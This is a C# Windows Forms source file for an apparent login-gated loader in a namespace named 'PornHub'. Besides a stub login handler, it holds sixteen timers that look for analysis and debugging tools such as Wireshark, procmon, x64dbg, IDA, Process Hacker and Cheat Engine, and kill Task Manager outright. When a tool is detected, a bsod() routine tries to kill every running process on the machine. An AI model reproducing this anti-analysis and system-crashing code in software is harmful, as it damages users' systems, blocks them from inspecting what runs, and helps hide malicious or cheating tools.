using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Drawing.Text;
using System.Net;
using System.Threading;
using FontAwesome.Sharp;
using Newtonsoft.Json.Linq;
using PornHub.Branding;
using PornHub.Game;
using PornHub.Properties;
using PornHub.Security;
using ReaLTaiizor.Controls;

namespace PornHub
{
    public partial class Form3 : Form
    {
        public Form3()
        {
            InitializeComponent();
        }

        private void Btn_TP_Set_Click(object sender, EventArgs e)
        {
            if (API.Login(username.Text, password.Text))
            {
                //Put code here of what you want to do after successful login
                MessageBox.Show("Login successful!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Form5 Form5 = new Form5();
                Form5.Show();
                base.Close();
            }

        }

        private void KeyTxtPnl_Paint(object sender, PaintEventArgs e)
        {

        }

        private void PasswordTxt_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form3_Load(object sender, EventArgs e)
        {

        }

   
       

   

        private void foreverButton1_Click(object sender, EventArgs e)
        {
            Form4 Form4 = new Form4();
            Form4.Show();
          
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void username_TextChanged(object sender, EventArgs e)
        {

        }

        private void KeyPicture_Click(object sender, EventArgs e)
        {

        }

		private void timer1_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("HTTP Debugger Windows Service (32 bit)");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000023B8 File Offset: 0x000005B8
		private void timer2_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				processesByName[0].Kill();
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000023E8 File Offset: 0x000005E8
		private void timer3_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("FolderChangesView");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x0000241C File Offset: 0x0000061C
		private void timer4_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("KsDumperClient");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002450 File Offset: 0x00000650
		private void timer5_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("ProcessHacker");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002484 File Offset: 0x00000684
		private void timer6_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("HTTPDebuggerUI");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000024B8 File Offset: 0x000006B8
		private void timer7_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("HTTPDebuggerSvc");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000024EC File Offset: 0x000006EC
		private void timer8_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("procmon");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002520 File Offset: 0x00000720
		private void timer9_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("idaq64");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002554 File Offset: 0x00000754
		private void timer10_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("Wireshark");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002588 File Offset: 0x00000788
		private void timer11_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("Xenos64");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x000025BC File Offset: 0x000007BC
		private void timer12_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("Cheat Engine");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000025F0 File Offset: 0x000007F0
		private void timer13_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("KsDumper");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002624 File Offset: 0x00000824
		private void timer14_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("KsDumper");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002658 File Offset: 0x00000858
		private void timer15_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("x64dbg.exe");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x0000268C File Offset: 0x0000088C
		private void timer16_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("x64dbg.exe");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				this.bsod();
				processesByName[0].Kill();
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x000026C0 File Offset: 0x000008C0
		public void bsod()
		{
			foreach (Process process in Process.GetProcesses())
			{
				try
				{
					Console.WriteLine(process.ProcessName);
					process.PriorityClass = ProcessPriorityClass.BelowNormal;
					process.Kill();
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.Message + " :: [ " + process.ProcessName + " ] Could not be killed");
				}
			}
		}
	}
}


